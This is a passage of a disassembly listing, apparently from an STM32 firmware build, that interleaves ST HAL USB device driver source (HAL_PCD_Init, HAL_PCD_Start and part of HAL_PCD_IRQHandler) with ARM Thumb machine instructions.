    GPIOx->BSRR = (uint32_t)GPIO_Pin;
 8001c06:	887a      	ldrh	r2, [r7, #2]
 8001c08:	687b      	ldr	r3, [r7, #4]
 8001c0a:	619a      	str	r2, [r3, #24]
  }
  else
  {
    GPIOx->BRR = (uint32_t)GPIO_Pin;
  }
}
 8001c0c:	e002      	b.n	8001c14 <HAL_GPIO_WritePin+0x24>
    GPIOx->BRR = (uint32_t)GPIO_Pin;
 8001c0e:	887a      	ldrh	r2, [r7, #2]
 8001c10:	687b      	ldr	r3, [r7, #4]
 8001c12:	629a      	str	r2, [r3, #40]	; 0x28
}
 8001c14:	bf00      	nop
 8001c16:	370c      	adds	r7, #12
 8001c18:	46bd      	mov	sp, r7
 8001c1a:	f85d 7b04 	ldr.w	r7, [sp], #4
 8001c1e:	4770      	bx	lr

08001c20 <HAL_PCD_Init>:
  *         parameters in the PCD_InitTypeDef and initialize the associated handle.
  * @param  hpcd PCD handle
  * @retval HAL status
  */
HAL_StatusTypeDef HAL_PCD_Init(PCD_HandleTypeDef *hpcd)
{
 8001c20:	b5f0      	push	{r4, r5, r6, r7, lr}
 8001c22:	b08b      	sub	sp, #44	; 0x2c
 8001c24:	af06      	add	r7, sp, #24
 8001c26:	6078      	str	r0, [r7, #4]
  USB_OTG_GlobalTypeDef *USBx;
#endif /* defined (USB_OTG_FS) */
  uint8_t i;

  /* Check the PCD handle allocation */
  if (hpcd == NULL)
 8001c28:	687b      	ldr	r3, [r7, #4]
 8001c2a:	2b00      	cmp	r3, #0
 8001c2c:	d101      	bne.n	8001c32 <HAL_PCD_Init+0x12>
  {
    return HAL_ERROR;
 8001c2e:	2301      	movs	r3, #1
 8001c30:	e0f8      	b.n	8001e24 <HAL_PCD_Init+0x204>

#if defined (USB_OTG_FS)
  USBx = hpcd->Instance;
#endif /* defined (USB_OTG_FS) */

  if (hpcd->State == HAL_PCD_STATE_RESET)
 8001c32:	687b      	ldr	r3, [r7, #4]
 8001c34:	f893 32a9 	ldrb.w	r3, [r3, #681]	; 0x2a9
 8001c38:	b2db      	uxtb	r3, r3
 8001c3a:	2b00      	cmp	r3, #0
 8001c3c:	d106      	bne.n	8001c4c <HAL_PCD_Init+0x2c>
  {
    /* Allocate lock resource and initialize it */
    hpcd->Lock = HAL_UNLOCKED;
 8001c3e:	687b      	ldr	r3, [r7, #4]
 8001c40:	2200      	movs	r2, #0
 8001c42:	f883 22a8 	strb.w	r2, [r3, #680]	; 0x2a8

    /* Init the low level hardware */
    hpcd->MspInitCallback(hpcd);
#else
    /* Init the low level hardware : GPIO, CLOCK, NVIC... */
    HAL_PCD_MspInit(hpcd);
 8001c46:	6878      	ldr	r0, [r7, #4]
 8001c48:	f00a fde4 	bl	800c814 <HAL_PCD_MspInit>
#endif /* (USE_HAL_PCD_REGISTER_CALLBACKS) */
  }

  hpcd->State = HAL_PCD_STATE_BUSY;
 8001c4c:	687b      	ldr	r3, [r7, #4]
 8001c4e:	2203      	movs	r2, #3
 8001c50:	f883 22a9 	strb.w	r2, [r3, #681]	; 0x2a9
    hpcd->Init.dma_enable = 0U;
  }
#endif /* defined (USB_OTG_FS) */

  /* Disable the Interrupts */
  __HAL_PCD_DISABLE(hpcd);
 8001c54:	687b      	ldr	r3, [r7, #4]
 8001c56:	681b      	ldr	r3, [r3, #0]
 8001c58:	4618      	mov	r0, r3
 8001c5a:	f004 f8d4 	bl	8005e06 <USB_DisableGlobalInt>

  /*Init the Core (common init.) */
  if (USB_CoreInit(hpcd->Instance, hpcd->Init) != HAL_OK)
 8001c5e:	687b      	ldr	r3, [r7, #4]
 8001c60:	681b      	ldr	r3, [r3, #0]
 8001c62:	603b      	str	r3, [r7, #0]
 8001c64:	687e      	ldr	r6, [r7, #4]
 8001c66:	466d      	mov	r5, sp
 8001c68:	f106 0410 	add.w	r4, r6, #16
 8001c6c:	cc0f      	ldmia	r4!, {r0, r1, r2, r3}
 8001c6e:	c50f      	stmia	r5!, {r0, r1, r2, r3}
 8001c70:	6823      	ldr	r3, [r4, #0]
 8001c72:	602b      	str	r3, [r5, #0]
 8001c74:	1d33      	adds	r3, r6, #4
 8001c76:	cb0e      	ldmia	r3, {r1, r2, r3}
 8001c78:	6838      	ldr	r0, [r7, #0]
 8001c7a:	f004 f89c 	bl	8005db6 <USB_CoreInit>
 8001c7e:	4603      	mov	r3, r0
 8001c80:	2b00      	cmp	r3, #0
 8001c82:	d005      	beq.n	8001c90 <HAL_PCD_Init+0x70>
  {
    hpcd->State = HAL_PCD_STATE_ERROR;
 8001c84:	687b      	ldr	r3, [r7, #4]
 8001c86:	2202      	movs	r2, #2
 8001c88:	f883 22a9 	strb.w	r2, [r3, #681]	; 0x2a9
    return HAL_ERROR;
 8001c8c:	2301      	movs	r3, #1
 8001c8e:	e0c9      	b.n	8001e24 <HAL_PCD_Init+0x204>
  }

  /* Force Device Mode*/
  (void)USB_SetCurrentMode(hpcd->Instance, USB_DEVICE_MODE);
 8001c90:	687b      	ldr	r3, [r7, #4]
 8001c92:	681b      	ldr	r3, [r3, #0]
 8001c94:	2100      	movs	r1, #0
 8001c96:	4618      	mov	r0, r3
 8001c98:	f004 f8d0 	bl	8005e3c <USB_SetCurrentMode>

  /* Init endpoints structures */
  for (i = 0U; i < hpcd->Init.dev_endpoints; i++)
 8001c9c:	2300      	movs	r3, #0
 8001c9e:	73fb      	strb	r3, [r7, #15]
 8001ca0:	e040      	b.n	8001d24 <HAL_PCD_Init+0x104>
  {
    /* Init ep structure */
    hpcd->IN_ep[i].is_in = 1U;
 8001ca2:	7bfb      	ldrb	r3, [r7, #15]
 8001ca4:	6879      	ldr	r1, [r7, #4]
 8001ca6:	1c5a      	adds	r2, r3, #1
 8001ca8:	4613      	mov	r3, r2
 8001caa:	009b      	lsls	r3, r3, #2
 8001cac:	4413      	add	r3, r2
 8001cae:	00db      	lsls	r3, r3, #3
 8001cb0:	440b      	add	r3, r1
 8001cb2:	3301      	adds	r3, #1
 8001cb4:	2201      	movs	r2, #1
 8001cb6:	701a      	strb	r2, [r3, #0]
    hpcd->IN_ep[i].num = i;
 8001cb8:	7bfb      	ldrb	r3, [r7, #15]
 8001cba:	6879      	ldr	r1, [r7, #4]
 8001cbc:	1c5a      	adds	r2, r3, #1
 8001cbe:	4613      	mov	r3, r2
 8001cc0:	009b      	lsls	r3, r3, #2
 8001cc2:	4413      	add	r3, r2
 8001cc4:	00db      	lsls	r3, r3, #3
 8001cc6:	440b      	add	r3, r1
 8001cc8:	7bfa      	ldrb	r2, [r7, #15]
 8001cca:	701a      	strb	r2, [r3, #0]
#if defined (USB_OTG_FS)
    hpcd->IN_ep[i].tx_fifo_num = i;
#endif /* defined (USB_OTG_FS) */
    /* Control until ep is activated */
    hpcd->IN_ep[i].type = EP_TYPE_CTRL;
 8001ccc:	7bfb      	ldrb	r3, [r7, #15]
 8001cce:	6879      	ldr	r1, [r7, #4]
 8001cd0:	1c5a      	adds	r2, r3, #1
 8001cd2:	4613      	mov	r3, r2
 8001cd4:	009b      	lsls	r3, r3, #2
 8001cd6:	4413      	add	r3, r2
 8001cd8:	00db      	lsls	r3, r3, #3
 8001cda:	440b      	add	r3, r1
 8001cdc:	3303      	adds	r3, #3
 8001cde:	2200      	movs	r2, #0
 8001ce0:	701a      	strb	r2, [r3, #0]
    hpcd->IN_ep[i].maxpacket = 0U;
 8001ce2:	7bfa      	ldrb	r2, [r7, #15]
 8001ce4:	6879      	ldr	r1, [r7, #4]
 8001ce6:	4613      	mov	r3, r2
 8001ce8:	009b      	lsls	r3, r3, #2
 8001cea:	4413      	add	r3, r2
 8001cec:	00db      	lsls	r3, r3, #3
 8001cee:	440b      	add	r3, r1
 8001cf0:	3338      	adds	r3, #56	; 0x38
 8001cf2:	2200      	movs	r2, #0
 8001cf4:	601a      	str	r2, [r3, #0]
    hpcd->IN_ep[i].xfer_buff = 0U;
 8001cf6:	7bfa      	ldrb	r2, [r7, #15]
 8001cf8:	6879      	ldr	r1, [r7, #4]
 8001cfa:	4613      	mov	r3, r2
 8001cfc:	009b      	lsls	r3, r3, #2
 8001cfe:	4413      	add	r3, r2
 8001d00:	00db      	lsls	r3, r3, #3
 8001d02:	440b      	add	r3, r1
 8001d04:	333c      	adds	r3, #60	; 0x3c
 8001d06:	2200      	movs	r2, #0
 8001d08:	601a      	str	r2, [r3, #0]
    hpcd->IN_ep[i].xfer_len = 0U;
 8001d0a:	7bfa      	ldrb	r2, [r7, #15]
 8001d0c:	6879      	ldr	r1, [r7, #4]
 8001d0e:	4613      	mov	r3, r2
 8001d10:	009b      	lsls	r3, r3, #2
 8001d12:	4413      	add	r3, r2
 8001d14:	00db      	lsls	r3, r3, #3
 8001d16:	440b      	add	r3, r1
 8001d18:	3340      	adds	r3, #64	; 0x40
 8001d1a:	2200      	movs	r2, #0
 8001d1c:	601a      	str	r2, [r3, #0]
  for (i = 0U; i < hpcd->Init.dev_endpoints; i++)
 8001d1e:	7bfb      	ldrb	r3, [r7, #15]
 8001d20:	3301      	adds	r3, #1
 8001d22:	73fb      	strb	r3, [r7, #15]
 8001d24:	7bfa      	ldrb	r2, [r7, #15]
 8001d26:	687b      	ldr	r3, [r7, #4]
 8001d28:	685b      	ldr	r3, [r3, #4]
 8001d2a:	429a      	cmp	r2, r3
 8001d2c:	d3b9      	bcc.n	8001ca2 <HAL_PCD_Init+0x82>
  }

  for (i = 0U; i < hpcd->Init.dev_endpoints; i++)
 8001d2e:	2300      	movs	r3, #0
 8001d30:	73fb      	strb	r3, [r7, #15]
 8001d32:	e044      	b.n	8001dbe <HAL_PCD_Init+0x19e>
  {
    hpcd->OUT_ep[i].is_in = 0U;
 8001d34:	7bfa      	ldrb	r2, [r7, #15]
 8001d36:	6879      	ldr	r1, [r7, #4]
 8001d38:	4613      	mov	r3, r2
 8001d3a:	009b      	lsls	r3, r3, #2
 8001d3c:	4413      	add	r3, r2
 8001d3e:	00db      	lsls	r3, r3, #3
 8001d40:	440b      	add	r3, r1
 8001d42:	f203 1369 	addw	r3, r3, #361	; 0x169
 8001d46:	2200      	movs	r2, #0
 8001d48:	701a      	strb	r2, [r3, #0]
    hpcd->OUT_ep[i].num = i;
 8001d4a:	7bfa      	ldrb	r2, [r7, #15]
 8001d4c:	6879      	ldr	r1, [r7, #4]
 8001d4e:	4613      	mov	r3, r2
 8001d50:	009b      	lsls	r3, r3, #2
 8001d52:	4413      	add	r3, r2
 8001d54:	00db      	lsls	r3, r3, #3
 8001d56:	440b      	add	r3, r1
 8001d58:	f503 73b4 	add.w	r3, r3, #360	; 0x168
 8001d5c:	7bfa      	ldrb	r2, [r7, #15]
 8001d5e:	701a      	strb	r2, [r3, #0]
    /* Control until ep is activated */
    hpcd->OUT_ep[i].type = EP_TYPE_CTRL;
 8001d60:	7bfa      	ldrb	r2, [r7, #15]
 8001d62:	6879      	ldr	r1, [r7, #4]
 8001d64:	4613      	mov	r3, r2
 8001d66:	009b      	lsls	r3, r3, #2
 8001d68:	4413      	add	r3, r2
 8001d6a:	00db      	lsls	r3, r3, #3
 8001d6c:	440b      	add	r3, r1
 8001d6e:	f203 136b 	addw	r3, r3, #363	; 0x16b
 8001d72:	2200      	movs	r2, #0
 8001d74:	701a      	strb	r2, [r3, #0]
    hpcd->OUT_ep[i].maxpacket = 0U;
 8001d76:	7bfa      	ldrb	r2, [r7, #15]
 8001d78:	6879      	ldr	r1, [r7, #4]
 8001d7a:	4613      	mov	r3, r2
 8001d7c:	009b      	lsls	r3, r3, #2
 8001d7e:	4413      	add	r3, r2
 8001d80:	00db      	lsls	r3, r3, #3
 8001d82:	440b      	add	r3, r1
 8001d84:	f503 73bc 	add.w	r3, r3, #376	; 0x178
 8001d88:	2200      	movs	r2, #0
 8001d8a:	601a      	str	r2, [r3, #0]
    hpcd->OUT_ep[i].xfer_buff = 0U;
 8001d8c:	7bfa      	ldrb	r2, [r7, #15]
 8001d8e:	6879      	ldr	r1, [r7, #4]
 8001d90:	4613      	mov	r3, r2
 8001d92:	009b      	lsls	r3, r3, #2
 8001d94:	4413      	add	r3, r2
 8001d96:	00db      	lsls	r3, r3, #3
 8001d98:	440b      	add	r3, r1
 8001d9a:	f503 73be 	add.w	r3, r3, #380	; 0x17c
 8001d9e:	2200      	movs	r2, #0
 8001da0:	601a      	str	r2, [r3, #0]
    hpcd->OUT_ep[i].xfer_len = 0U;
 8001da2:	7bfa      	ldrb	r2, [r7, #15]
 8001da4:	6879      	ldr	r1, [r7, #4]
 8001da6:	4613      	mov	r3, r2
 8001da8:	009b      	lsls	r3, r3, #2
 8001daa:	4413      	add	r3, r2
 8001dac:	00db      	lsls	r3, r3, #3
 8001dae:	440b      	add	r3, r1
 8001db0:	f503 73c0 	add.w	r3, r3, #384	; 0x180
 8001db4:	2200      	movs	r2, #0
 8001db6:	601a      	str	r2, [r3, #0]
  for (i = 0U; i < hpcd->Init.dev_endpoints; i++)
 8001db8:	7bfb      	ldrb	r3, [r7, #15]
 8001dba:	3301      	adds	r3, #1
 8001dbc:	73fb      	strb	r3, [r7, #15]
 8001dbe:	7bfa      	ldrb	r2, [r7, #15]
 8001dc0:	687b      	ldr	r3, [r7, #4]
 8001dc2:	685b      	ldr	r3, [r3, #4]
 8001dc4:	429a      	cmp	r2, r3
 8001dc6:	d3b5      	bcc.n	8001d34 <HAL_PCD_Init+0x114>
  }

  /* Init Device */
  if (USB_DevInit(hpcd->Instance, hpcd->Init) != HAL_OK)
 8001dc8:	687b      	ldr	r3, [r7, #4]
 8001dca:	681b      	ldr	r3, [r3, #0]
 8001dcc:	603b      	str	r3, [r7, #0]
 8001dce:	687e      	ldr	r6, [r7, #4]
 8001dd0:	466d      	mov	r5, sp
 8001dd2:	f106 0410 	add.w	r4, r6, #16
 8001dd6:	cc0f      	ldmia	r4!, {r0, r1, r2, r3}
 8001dd8:	c50f      	stmia	r5!, {r0, r1, r2, r3}
 8001dda:	6823      	ldr	r3, [r4, #0]
 8001ddc:	602b      	str	r3, [r5, #0]
 8001dde:	1d33      	adds	r3, r6, #4
 8001de0:	cb0e      	ldmia	r3, {r1, r2, r3}
 8001de2:	6838      	ldr	r0, [r7, #0]
 8001de4:	f004 f837 	bl	8005e56 <USB_DevInit>
 8001de8:	4603      	mov	r3, r0
 8001dea:	2b00      	cmp	r3, #0
 8001dec:	d005      	beq.n	8001dfa <HAL_PCD_Init+0x1da>
  {
    hpcd->State = HAL_PCD_STATE_ERROR;
 8001dee:	687b      	ldr	r3, [r7, #4]
 8001df0:	2202      	movs	r2, #2
 8001df2:	f883 22a9 	strb.w	r2, [r3, #681]	; 0x2a9
    return HAL_ERROR;
 8001df6:	2301      	movs	r3, #1
 8001df8:	e014      	b.n	8001e24 <HAL_PCD_Init+0x204>
  }

  hpcd->USB_Address = 0U;
 8001dfa:	687b      	ldr	r3, [r7, #4]
 8001dfc:	2200      	movs	r2, #0
 8001dfe:	f883 2024 	strb.w	r2, [r3, #36]	; 0x24
  hpcd->State = HAL_PCD_STATE_READY;
 8001e02:	687b      	ldr	r3, [r7, #4]
 8001e04:	2201      	movs	r2, #1
 8001e06:	f883 22a9 	strb.w	r2, [r3, #681]	; 0x2a9

  /* Activate LPM */
  if (hpcd->Init.lpm_enable == 1U)
 8001e0a:	687b      	ldr	r3, [r7, #4]
 8001e0c:	69db      	ldr	r3, [r3, #28]
 8001e0e:	2b01      	cmp	r3, #1
 8001e10:	d102      	bne.n	8001e18 <HAL_PCD_Init+0x1f8>
  {
    (void)HAL_PCDEx_ActivateLPM(hpcd);
 8001e12:	6878      	ldr	r0, [r7, #4]
 8001e14:	f001 fc9e 	bl	8003754 <HAL_PCDEx_ActivateLPM>
  }

  (void)USB_DevDisconnect(hpcd->Instance);
 8001e18:	687b      	ldr	r3, [r7, #4]
 8001e1a:	681b      	ldr	r3, [r3, #0]
 8001e1c:	4618      	mov	r0, r3
 8001e1e:	f006 fadf 	bl	80083e0 <USB_DevDisconnect>

  return HAL_OK;
 8001e22:	2300      	movs	r3, #0
}
 8001e24:	4618      	mov	r0, r3
 8001e26:	3714      	adds	r7, #20
 8001e28:	46bd      	mov	sp, r7
 8001e2a:	bdf0      	pop	{r4, r5, r6, r7, pc}

08001e2c <HAL_PCD_Start>:
  * @brief  Start the USB device
  * @param  hpcd PCD handle
  * @retval HAL status
  */
HAL_StatusTypeDef HAL_PCD_Start(PCD_HandleTypeDef *hpcd)
{
 8001e2c:	b580      	push	{r7, lr}
 8001e2e:	b082      	sub	sp, #8
 8001e30:	af00      	add	r7, sp, #0
 8001e32:	6078      	str	r0, [r7, #4]
#if defined (USB_OTG_FS)
  USB_OTG_GlobalTypeDef *USBx = hpcd->Instance;
#endif /* defined (USB_OTG_FS) */

  __HAL_LOCK(hpcd);
 8001e34:	687b      	ldr	r3, [r7, #4]
 8001e36:	f893 32a8 	ldrb.w	r3, [r3, #680]	; 0x2a8
 8001e3a:	2b01      	cmp	r3, #1
 8001e3c:	d101      	bne.n	8001e42 <HAL_PCD_Start+0x16>
 8001e3e:	2302      	movs	r3, #2
 8001e40:	e012      	b.n	8001e68 <HAL_PCD_Start+0x3c>
 8001e42:	687b      	ldr	r3, [r7, #4]
 8001e44:	2201      	movs	r2, #1
 8001e46:	f883 22a8 	strb.w	r2, [r3, #680]	; 0x2a8
  {
    /* Enable USB Transceiver */
    USBx->GCCFG |= USB_OTG_GCCFG_PWRDWN;
  }
#endif /* defined (USB_OTG_FS) */
  __HAL_PCD_ENABLE(hpcd);
 8001e4a:	687b      	ldr	r3, [r7, #4]
 8001e4c:	681b      	ldr	r3, [r3, #0]
 8001e4e:	4618      	mov	r0, r3
 8001e50:	f003 ffc2 	bl	8005dd8 <USB_EnableGlobalInt>
  (void)USB_DevConnect(hpcd->Instance);
 8001e54:	687b      	ldr	r3, [r7, #4]
 8001e56:	681b      	ldr	r3, [r3, #0]
 8001e58:	4618      	mov	r0, r3
 8001e5a:	f006 faaa 	bl	80083b2 <USB_DevConnect>
  __HAL_UNLOCK(hpcd);
 8001e5e:	687b      	ldr	r3, [r7, #4]
 8001e60:	2200      	movs	r2, #0
 8001e62:	f883 22a8 	strb.w	r2, [r3, #680]	; 0x2a8

  return HAL_OK;
 8001e66:	2300      	movs	r3, #0
}
 8001e68:	4618      	mov	r0, r3
 8001e6a:	3708      	adds	r7, #8
 8001e6c:	46bd      	mov	sp, r7
 8001e6e:	bd80      	pop	{r7, pc}

08001e70 <HAL_PCD_IRQHandler>:
  * @brief  This function handles PCD interrupt request.
  * @param  hpcd PCD handle
  * @retval HAL status
  */
void HAL_PCD_IRQHandler(PCD_HandleTypeDef *hpcd)
{
 8001e70:	b580      	push	{r7, lr}
 8001e72:	b084      	sub	sp, #16
 8001e74:	af00      	add	r7, sp, #0
 8001e76:	6078      	str	r0, [r7, #4]
  uint32_t wIstr = USB_ReadInterrupts(hpcd->Instance);
 8001e78:	687b      	ldr	r3, [r7, #4]
 8001e7a:	681b      	ldr	r3, [r3, #0]
 8001e7c:	4618      	mov	r0, r3
 8001e7e:	f006 fac4 	bl	800840a <USB_ReadInterrupts>
 8001e82:	60f8      	str	r0, [r7, #12]

  if ((wIstr & USB_ISTR_CTR) == USB_ISTR_CTR)
 8001e84:	68fb      	ldr	r3, [r7, #12]
 8001e86:	f403 4300 	and.w	r3, r3, #32768	; 0x8000
 8001e8a:	2b00      	cmp	r3, #0
 8001e8c:	d003      	beq.n	8001e96 <HAL_PCD_IRQHandler+0x26>
  {
    /* servicing of the endpoint correct transfer interrupt */
    /* clear of the CTR flag into the sub */
    (void)PCD_EP_ISR_Handler(hpcd);
 8001e8e:	6878      	ldr	r0, [r7, #4]
 8001e90:	f000 fb59 	bl	8002546 <PCD_EP_ISR_Handler>

    return;
 8001e94:	e110      	b.n	80020b8 <HAL_PCD_IRQHandler+0x248>
  }

  if ((wIstr & USB_ISTR_RESET) == USB_ISTR_RESET)
 8001e96:	68fb      	ldr	r3, [r7, #12]
 8001e98:	f403 6380 	and.w	r3, r3, #1024	; 0x400
 8001e9c:	2b00      	cmp	r3, #0
 8001e9e:	d013      	beq.n	8001ec8 <HAL_PCD_IRQHandler+0x58>
  {
    __HAL_PCD_CLEAR_FLAG(hpcd, USB_ISTR_RESET);
 8001ea0:	687b      	ldr	r3, [r7, #4]
 8001ea2:	681b      	ldr	r3, [r3, #0]
 8001ea4:	f8b3 3044 	ldrh.w	r3, [r3, #68]	; 0x44
 8001ea8:	b29a      	uxth	r2, r3
 8001eaa:	687b      	ldr	r3, [r7, #4]
 8001eac:	681b      	ldr	r3, [r3, #0]
 8001eae:	f422 6280 	bic.w	r2, r2, #1024	; 0x400
 8001eb2:	b292      	uxth	r2, r2
 8001eb4:	f8a3 2044 	strh.w	r2, [r3, #68]	; 0x44

#if (USE_HAL_PCD_REGISTER_CALLBACKS == 1U)
    hpcd->ResetCallback(hpcd);
#else
    HAL_PCD_ResetCallback(hpcd);
 8001eb8:	6878      	ldr	r0, [r7, #4]
 8001eba:	f00a fd4c 	bl	800c956 <HAL_PCD_ResetCallback>
#endif /* USE_HAL_PCD_REGISTER_CALLBACKS */

    (void)HAL_PCD_SetAddress(hpcd, 0U);
 8001ebe:	2100      	movs	r1, #0
 8001ec0:	6878      	ldr	r0, [r7, #4]
 8001ec2:	f000 f8fc 	bl	80020be <HAL_PCD_SetAddress>

    return;
 8001ec6:	e0f7      	b.n	80020b8 <HAL_PCD_IRQHandler+0x248>
  }

  if ((wIstr & USB_ISTR_PMAOVR) == USB_ISTR_PMAOVR)
 8001ec8:	68fb      	ldr	r3, [r7, #12]
 8001eca:	f403 4380 	and.w	r3, r3, #16384	; 0x4000
 8001ece:	2b00      	cmp	r3, #0
 8001ed0:	d00c      	beq.n	8001eec <HAL_PCD_IRQHandler+0x7c>
  {
    __HAL_PCD_CLEAR_FLAG(hpcd, USB_ISTR_PMAOVR);
 8001ed2:	687b      	ldr	r3, [r7, #4]
 8001ed4:	681b      	ldr	r3, [r3, #0]
 8001ed6:	f8b3 3044 	ldrh.w	r3, [r3, #68]	; 0x44
 8001eda:	b29a      	uxth	r2, r3
 8001edc:	687b      	ldr	r3, [r7, #4]
 8001ede:	681b      	ldr	r3, [r3, #0]
 8001ee0:	f422 4280 	bic.w	r2, r2, #16384	; 0x4000
 8001ee4:	b292      	uxth	r2, r2
 8001ee6:	f8a3 2044 	strh.w	r2, [r3, #68]	; 0x44

    return;
 8001eea:	e0e5      	b.n	80020b8 <HAL_PCD_IRQHandler+0x248>
  }

  if ((wIstr & USB_ISTR_ERR) == USB_ISTR_ERR)
 8001eec:	68fb      	ldr	r3, [r7, #12]
 8001eee:	f403 5300 	and.w	r3, r3, #8192	; 0x2000
 8001ef2:	2b00      	cmp	r3, #0
 8001ef4:	d00c      	beq.n	8001f10 <HAL_PCD_IRQHandler+0xa0>
  {
    __HAL_PCD_CLEAR_FLAG(hpcd, USB_ISTR_ERR);
 8001ef6:	687b      	ldr	r3, [r7, #4]
 8001ef8:	681b      	ldr	r3, [r3, #0]
 8001efa:	f8b3 3044 	ldrh.w	r3, [r3, #68]	; 0x44
 8001efe:	b29a      	uxth	r2, r3
 8001f00:	687b      	ldr	r3, [r7, #4]
 8001f02:	681b      	ldr	r3, [r3, #0]
 8001f04:	f422 5200 	bic.w	r2, r2, #8192	; 0x2000
 8001f08:	b292      	uxth	r2, r2
 8001f0a:	f8a3 2044 	strh.w	r2, [r3, #68]	; 0x44

    return;
 8001f0e:	e0d3      	b.n	80020b8 <HAL_PCD_IRQHandler+0x248>
  }

  if ((wIstr & USB_ISTR_WKUP) == USB_ISTR_WKUP)
 8001f10:	68fb      	ldr	r3, [r7, #12]
 8001f12:	f403 5380 	and.w	r3, r3, #4096	; 0x1000
 8001f16:	2b00      	cmp	r3, #0
 8001f18:	d034      	beq.n	8001f84 <HAL_PCD_IRQHandler+0x114>
  {
    hpcd->Instance->CNTR &= (uint16_t) ~(USB_CNTR_LPMODE);
 8001f1a:	687b      	ldr	r3, [r7, #4]
 8001f1c:	681b      	ldr	r3, [r3, #0]
 8001f1e:	f8b3 3040 	ldrh.w	r3, [r3, #64]	; 0x40
 8001f22:	b29a      	uxth	r2, r3
 8001f24:	687b      	ldr	r3, [r7, #4]
 8001f26:	681b      	ldr	r3, [r3, #0]
 8001f28:	f022 0204 	bic.w	r2, r2, #4
 8001f2c:	b292      	uxth	r2, r2
 8001f2e:	f8a3 2040 	strh.w	r2, [r3, #64]	; 0x40
    hpcd->Instance->CNTR &= (uint16_t) ~(USB_CNTR_FSUSP);
 8001f32:	687b      	ldr	r3, [r7, #4]
 8001f34:	681b      	ldr	r3, [r3, #0]
 8001f36:	f8b3 3040 	ldrh.w	r3, [r3, #64]	; 0x40
 8001f3a:	b29a      	uxth	r2, r3
 8001f3c:	687b      	ldr	r3, [r7, #4]
 8001f3e:	681b      	ldr	r3, [r3, #0]
 8001f40:	f022 0208 	bic.w	r2, r2, #8
 8001f44:	b292      	uxth	r2, r2
 8001f46:	f8a3 2040 	strh.w	r2, [r3, #64]	; 0x40

    if (hpcd->LPM_State == LPM_L1)
 8001f4a:	687b      	ldr	r3, [r7, #4]
 8001f4c:	f893 32e0 	ldrb.w	r3, [r3, #736]	; 0x2e0
 8001f50:	2b01      	cmp	r3, #1
 8001f52:	d107      	bne.n	8001f64 <HAL_PCD_IRQHandler+0xf4>
    {
      hpcd->LPM_State = LPM_L0;
 8001f54:	687b      	ldr	r3, [r7, #4]
 8001f56:	2200      	movs	r2, #0
 8001f58:	f883 22e0 	strb.w	r2, [r3, #736]	; 0x2e0
#if (USE_HAL_PCD_REGISTER_CALLBACKS == 1U)
      hpcd->LPMCallback(hpcd, PCD_LPM_L0_ACTIVE);
#else
      HAL_PCDEx_LPM_Callback(hpcd, PCD_LPM_L0_ACTIVE);
 8001f5c:	2100      	movs	r1, #0
 8001f5e:	6878      	ldr	r0, [r7, #4]
 8001f60:	f00a ffd6 	bl	800cf10 <HAL_PCDEx_LPM_Callback>
    }

#if (USE_HAL_PCD_REGISTER_CALLBACKS == 1U)
    hpcd->ResumeCallback(hpcd);
#else
    HAL_PCD_ResumeCallback(hpcd);
 8001f64:	6878      	ldr	r0, [r7, #4]
 8001f66:	f00a fd2f 	bl	800c9c8 <HAL_PCD_ResumeCallback>
#endif /* USE_HAL_PCD_REGISTER_CALLBACKS */

    __HAL_PCD_CLEAR_FLAG(hpcd, USB_ISTR_WKUP);
 8001f6a:	687b      	ldr	r3, [r7, #4]
 8001f6c:	681b      	ldr	r3, [r3, #0]
 8001f6e:	f8b3 3044 	ldrh.w	r3, [r3, #68]	; 0x44
 8001f72:	b29a      	uxth	r2, r3
 8001f74:	687b      	ldr	r3, [r7, #4]
 8001f76:	681b      	ldr	r3, [r3, #0]
 8001f78:	f422 5280 	bic.w	r2, r2, #4096	; 0x1000
 8001f7c:	b292      	uxth	r2, r2
 8001f7e:	f8a3 2044 	strh.w	r2, [r3, #68]	; 0x44

    return;
 8001f82:	e099      	b.n	80020b8 <HAL_PCD_IRQHandler+0x248>
  }

  if ((wIstr & USB_ISTR_SUSP) == USB_ISTR_SUSP)
 8001f84:	68fb      	ldr	r3, [r7, #12]
 8001f86:	f403 6300 	and.w	r3, r3, #2048	; 0x800
 8001f8a:	2b00      	cmp	r3, #0
 8001f8c:	d027      	beq.n	8001fde <HAL_PCD_IRQHandler+0x16e>
  {
    /* Force low-power mode in the macrocell */
    hpcd->Instance->CNTR |= (uint16_t)USB_CNTR_FSUSP;
 8001f8e:	687b      	ldr	r3, [r7, #4]
 8001f90:	681b      	ldr	r3, [r3, #0]
 8001f92:	f8b3 3040 	ldrh.w	r3, [r3, #64]	; 0x40
 8001f96:	b29a      	uxth	r2, r3
 8001f98:	687b      	ldr	r3, [r7, #4]
 8001f9a:	681b      	ldr	r3, [r3, #0]
 8001f9c:	f042 0208 	orr.w	r2, r2, #8
 8001fa0:	b292      	uxth	r2, r2
 8001fa2:	f8a3 2040 	strh.w	r2, [r3, #64]	; 0x40

    /* clear of the ISTR bit must be done after setting of CNTR_FSUSP */
    __HAL_PCD_CLEAR_FLAG(hpcd, USB_ISTR_SUSP);
 8001fa6:	687b      	ldr	r3, [r7, #4]
 8001fa8:	681b      	ldr	r3, [r3, #0]
 8001faa:	f8b3 3044 	ldrh.w	r3, [r3, #68]	; 0x44
 8001fae:	b29a      	uxth	r2, r3
 8001fb0:	687b      	ldr	r3, [r7, #4]
 8001fb2:	681b      	ldr	r3, [r3, #0]
 8001fb4:	f422 6200 	bic.w	r2, r2, #2048	; 0x800
 8001fb8:	b292      	uxth	r2, r2
 8001fba:	f8a3 2044 	strh.w	r2, [r3, #68]	; 0x44

    hpcd->Instance->CNTR |= (uint16_t)USB_CNTR_LPMODE;
 8001fbe:	687b      	ldr	r3, [r7, #4]
 8001fc0:	681b      	ldr	r3, [r3, #0]
 8001fc2:	f8b3 3040 	ldrh.w	r3, [r3, #64]	; 0x40
 8001fc6:	b29a      	uxth	r2, r3
 8001fc8:	687b      	ldr	r3, [r7, #4]
 8001fca:	681b      	ldr	r3, [r3, #0]
 8001fcc:	f042 0204 	orr.w	r2, r2, #4
 8001fd0:	b292      	uxth	r2, r2
 8001fd2:	f8a3 2040 	strh.w	r2, [r3, #64]	; 0x40

#if (USE_HAL_PCD_REGISTER_CALLBACKS == 1U)
    hpcd->SuspendCallback(hpcd);
#else
    HAL_PCD_SuspendCallback(hpcd);
 8001fd6:	6878      	ldr	r0, [r7, #4]
 8001fd8:	f00a fcdc 	bl	800c994 <HAL_PCD_SuspendCallback>
#endif /* USE_HAL_PCD_REGISTER_CALLBACKS */

    return;
 8001fdc:	e06c      	b.n	80020b8 <HAL_PCD_IRQHandler+0x248>
  }

  /* Handle LPM Interrupt */
